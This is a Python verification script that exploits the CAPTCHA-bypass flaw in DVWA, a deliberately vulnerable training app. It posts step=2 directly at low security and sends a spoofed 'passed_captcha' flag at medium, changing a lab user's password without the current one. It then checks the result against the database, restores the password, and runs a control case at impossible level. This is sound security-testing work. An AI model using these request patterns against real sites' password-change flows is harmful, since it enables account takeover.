# -*- coding: utf-8 -*-
"""OPT4-LG-01: DVWA captcha password-change state machine bypass.

low    -- POST step=2 directly: no CAPTCHA, no current password.
medium -- negative without passed_captcha, positive with the spoofed flag.
impossible -- no token -> rejected (checkToken), counterexample.
Victim is the dedicated usage of gordonb; password hash restored via DB.
"""
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from opt4lib import (  # noqa: E402
    BATCH_ID, BASE_DVWA, SOURCE_COMMIT_DVWA, Client, Run, db_query,
    dvwa_login, md5_hex,
)

ORIGINAL = "abc123"
NEW_LOW = "Opt4Lg01Low2026"
NEW_MED = "Opt4Lg01Med2026"


def gordonb_hash() -> str:
    rows = db_query("SELECT password FROM dvwa.users WHERE user='gordonb'")
    return rows[0][0] if rows else ""


def restore() -> None:
    db_query("UPDATE dvwa.users SET password = MD5('abc123') WHERE user = 'gordonb'")


def main() -> int:
    run = Run("opt4-20261020-lg01", {
        "case_id": "OPT4-LG-01",
        "batch_id": BATCH_ID,
        "deployment_id": "dvwa-wsl-02",
        "source_commit": SOURCE_COMMIT_DVWA,
        "base": BASE_DVWA,
    })
    obs: dict = {"steps": {}}
    obs["original_hash_ok"] = gordonb_hash() == md5_hex(ORIGINAL)

    # --- low: jump straight to step 2 (SEQ-A03)
    # NOTE: with empty reCAPTCHA keys, captcha/index.php:38-42 overwrites
    # $html with the "Please register for a key" banner after the source file
    # ran, so page messages are invisible; verdicts rely on DB readback.
    c_low = Client(BASE_DVWA)
    dvwa_login(c_low, "gordonb", ORIGINAL)
    c_low.set_cookie("security", "low")
    low_post = c_low.post("/vulnerabilities/captcha/", data={
        "step": "2", "password_new": NEW_LOW, "password_conf": NEW_LOW,
        "Change": "Change",
    })
    low_changed = gordonb_hash() == md5_hex(NEW_LOW)
    obs["steps"]["low_jump"] = {
        "status": low_post.status,
        "page_message_visible": "Password Changed." in low_post.text,
        "page_html_overwritten_by_key_banner": "Please register for a key" in low_post.text,
        "hash_changed_without_current_password": low_changed,
    }
    restore()
    obs["steps"]["low_jump"]["restored"] = gordonb_hash() == md5_hex(ORIGINAL)

    # --- medium: flag is the only gate (SEQ-A04)
    c_med = Client(BASE_DVWA)
    dvwa_login(c_med, "gordonb", ORIGINAL)
    c_med.set_cookie("security", "medium")
    med_neg = c_med.post("/vulnerabilities/captcha/", data={
        "step": "2", "password_new": NEW_MED, "password_conf": NEW_MED,
        "Change": "Change",
    })
    # captured immediately: without the flag the medium handler must block
    neg_blocked = gordonb_hash() == md5_hex(ORIGINAL)
    med_pos = c_med.post("/vulnerabilities/captcha/", data={
        "step": "2", "passed_captcha": "true",
        "password_new": NEW_MED, "password_conf": NEW_MED,
        "Change": "Change",
    })
    pos_changed = gordonb_hash() == md5_hex(NEW_MED)
    obs["steps"]["medium_client_flag"] = {
        "negative_blocked_without_flag": neg_blocked,
        "negative_page_notice_visible": "You have not passed the CAPTCHA." in med_neg.text,
        "positive_changed_with_spoofed_flag": pos_changed,
    }
    restore()
    obs["steps"]["medium_client_flag"]["restored"] = gordonb_hash() == md5_hex(ORIGINAL)

    # --- impossible counterexample: token required (SEQ-C02 mechanism)
    c_imp = Client(BASE_DVWA)
    dvwa_login(c_imp, "gordonb", ORIGINAL)
    c_imp.set_cookie("security", "impossible")
    imp_post = c_imp.post("/vulnerabilities/captcha/", data={
        "step": "2", "password_new": NEW_LOW, "password_conf": NEW_LOW,
        "Change": "Change",
    })
    obs["steps"]["impossible_control"] = {
        "status": imp_post.status,
        "rejected_by_token_check": imp_post.status in (301, 302),
        "no_change": gordonb_hash() == md5_hex(ORIGINAL),
    }

    final = gordonb_hash() == md5_hex(ORIGINAL)
    run.write_restore({
        "gordonb_hash": gordonb_hash(),
        "expected": md5_hex(ORIGINAL),
        "restored": final,
    })
    verdict = (
        obs["original_hash_ok"]
        and obs["steps"]["low_jump"]["hash_changed_without_current_password"]
        and obs["steps"]["low_jump"]["restored"]
        and obs["steps"]["medium_client_flag"]["negative_blocked_without_flag"]
        and obs["steps"]["medium_client_flag"]["positive_changed_with_spoofed_flag"]
        and obs["steps"]["medium_client_flag"]["restored"]
        and obs["steps"]["impossible_control"]["rejected_by_token_check"]
        and final
    )
    obs["verdict"] = "触发" if verdict else "未触发"
    run.dump_clients({"low": c_low, "medium": c_med, "impossible": c_imp})
    run.artifact("captcha.low.response.html", low_post.text)
    run.artifact("captcha.medium.negative.html", med_neg.text)
    run.artifact("captcha.medium.positive.html", med_pos.text)
    record = run.finish(obs)
    print(f"verdict={obs['verdict']}")
    print(f"evidence={record['run_id']} artifacts={len(run.artifact_hashes())}")
    return 0 if verdict else 1


if __name__ == "__main__":
    raise SystemExit(main())
